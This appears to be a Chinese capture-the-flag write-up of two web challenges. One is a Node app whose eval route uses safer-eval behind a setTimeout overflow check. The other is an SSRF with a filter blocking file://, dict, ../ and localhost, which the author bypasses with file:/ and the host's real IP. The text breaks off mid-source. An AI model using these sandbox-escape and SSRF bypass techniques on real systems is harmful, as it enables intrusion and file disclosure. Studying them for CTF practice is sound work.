三剑客 - EzNode</h3>\n<p>看到首页</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051614492.png\" alt=\"image-20230405161417448\" /></p>\n<p>版本</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"src\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token string\">\"version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"index.js\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token string\">\"license\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"MIT\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token string\">\"dependencies\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"body-parser\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1.19.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">\"express\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"4.17.1\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">\"safer-eval\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1.3.6\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>源码</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> bodyParser <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">const</span> saferEval <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'safer-eval'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2019.7/WORKER1 找到一个很棒的库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">urlencoded</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">extended</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 2020.1/WORKER2 老板说为了后期方便优化</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>path <span class=\"token operator\">===</span> <span class=\"token string\">'/eval'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">let</span> delay <span class=\"token operator\">=</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Number<span class=\"token punctuation\">.</span><span class=\"token function\">isInteger</span><span class=\"token punctuation\">(</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      delay <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">,</span> <span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">const</span> t <span class=\"token operator\">=</span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">clearTimeout</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'timeout'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Timeout!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/eval'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">let</span> response <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      response <span class=\"token operator\">=</span> <span class=\"token function\">saferEval</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      response <span class=\"token operator\">=</span> <span class=\"token string\">'Wrong Wrong Wrong!!!!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算 KPI</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/source'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text/javascript;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./index.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/version'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text/json;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./package.json'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text/html;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./index.html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Start listening'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>后面的部分都在首页面给出了，题目的核心在两个 eval 路由上，先看第一个</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token comment\">// 如果请求路径为 '/eval'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>path <span class=\"token operator\">===</span> <span class=\"token string\">'/eval'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 设置延迟时间为 60 秒</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">let</span> delay <span class=\"token operator\">=</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 如果请求参数中有 delay 参数，则将延迟时间设置为 delay 参数的值和当前延迟时间的最大值</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Number<span class=\"token punctuation\">.</span><span class=\"token function\">isInteger</span><span class=\"token punctuation\">(</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      delay <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">,</span> <span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 设置一个定时器，延迟时间到期后执行 next () 函数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">const</span> t <span class=\"token operator\">=</span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 如果延迟时间过长，设置一个 1 秒的定时器，到期后清除之前设置的定时器，并返回 'Timeout!' 字符串</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token function\">clearTimeout</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'timeout'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Timeout!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// 如果请求路径不为 '/eval'，则执行 next () 函数</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>简答来说就是通过 <code>/eval?delay=</code>  上传一个数字并和 60000 比较，大的赋值给 delay</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>浏览器内部使用<span class=\"token number\">32</span>位带符号的整数来储存推迟执行的时间这意味着setTimeout最多延迟<span class=\"token number\">2147483647</span>秒（<span class=\"token number\">24.8</span>天）。只要大于<span class=\"token number\">2147483647</span><span class=\"token punctuation\">,</span>就会发生溢出</pre></td></tr></table></figure><p>根据版本找到一个 cve<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvbW1lbnRob2wvc2FmZXItZXZhbC9pc3N1ZXMvMTA=\">Breakout · Issue #10 · commenthol/safer-eval (github.com)</span>，直接用就行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051628984.png\" alt=\"image-20230405162804912\" /></p>\n<h3 id=\"ez三剑客-ezweb\"><a class=\"anchor\" href=\"#ez三剑客-ezweb\">#</a> EZ 三剑客 - EzWeb</h3>\n<p>看源码有一个 get 传参</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629938.png\" alt=\"image-20230405162919887\" /></p>\n<p>访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629926.png\" alt=\"image-20230405162928878\" /></p>\n<p>给了网卡信息，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctMHYxZWw1YmM3cGkwMmIwNzBkLmJhaWR1LmNvbQ==\">在前段输入 www.baidu.com</span>, 可以访问到这个页面。又是一个 ssrf</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051630056.png\" alt=\"image-20230405163052975\" /></p>\n<p>不让访问 127.0.0.1 但是可以使用真实 ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051636213.png\" alt=\"image-20230405163646133\" /></p>\n<p>尝试使用 file 读文件 file 协议被过滤了，尝试通过 file:/ 或者 file: // 去绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051641155.png\" alt=\"image-20230405164131078\" /></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">curl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token comment\">//echo $url.\"\\n\";</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token 